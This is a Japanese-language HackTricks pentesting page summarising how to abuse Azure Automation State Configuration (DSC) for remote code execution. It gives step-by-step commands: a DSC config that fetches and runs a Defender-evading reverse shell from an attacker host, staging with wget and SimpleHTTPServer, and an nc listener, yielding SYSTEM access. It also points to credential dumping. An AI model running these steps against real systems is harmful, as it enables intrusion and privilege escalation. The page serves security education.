# Az - State Configuration RCE

{{#include ../../../../banners/hacktricks-training.md}}

**完全な投稿を確認してください:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### リモートサーバー (C2) インフラストラクチャの準備と手順の概要

#### 概要

このプロセスは、Windows Defenderを回避するように設計された修正されたNishang `Invoke-PowerShellTcp.ps1` ペイロード、`RevPS.ps1` をホストするためのリモートサーバーインフラストラクチャの設定を含みます。このペイロードは、IP `40.84.7.74` のKali LinuxマシンからシンプルなPython HTTPサーバーを使用して提供されます。操作は以下のいくつかのステップを通じて実行されます：

#### ステップ 1 — ファイルの作成

- **必要なファイル:** 2つのPowerShellスクリプトが必要です：
1. `reverse_shell_config.ps1`: ペイロードを取得して実行するDesired State Configuration (DSC)ファイル。これは[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1)から入手可能です。
2. `push_reverse_shell_config.ps1`: VMに構成を公開するためのスクリプトで、[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1)で入手できます。
- **カスタマイズ:** これらのファイル内の変数とパラメータは、リソース名、ファイルパス、サーバー/ペイロード識別子を含むユーザーの特定の環境に合わせて調整する必要があります。

#### ステップ 2 — 構成ファイルの圧縮

- `reverse_shell_config.ps1` は `.zip` ファイルに圧縮され、Azure Storage Accountへの転送の準備が整います。
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### ステップ 3 — ストレージコンテキストの設定とアップロード

- ZIP形式の構成ファイルは、AzureのSet-AzStorageBlobContent cmdletを使用して、事前に定義されたAzure Storageコンテナazure-pentestにアップロードされます。
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### ステップ 4 — Kali ボックスの準備

- Kali サーバーは GitHub リポジトリから RevPS.ps1 ペイロードをダウンロードします。
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- スクリプトは、ターゲットのWindows VMとリバースシェルのポートを指定するように編集されます。

#### ステップ 5 — 設定ファイルの公開

- 設定ファイルが実行され、リバースシェルスクリプトがWindows VMの指定された場所にデプロイされます。

#### ステップ 6 — ペイロードのホスティングとリスナーの設定

- ペイロードをホストするためにPythonのSimpleHTTPServerが起動され、受信接続をキャプチャするためのNetcatリスナーが設定されます。
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- スケジュールされたタスクがペイロードを実行し、SYSTEMレベルの特権を達成します。

#### 結論

このプロセスの成功した実行は、資格情報のダンプや攻撃を複数のVMに拡大するなど、さらなるアクションのための多くの可能性を開きます。このガイドは、Azure Automation DSCの領域での継続的な学習と創造性を奨励しています。

{{#include ../../../../banners/hacktricks-training.md}}
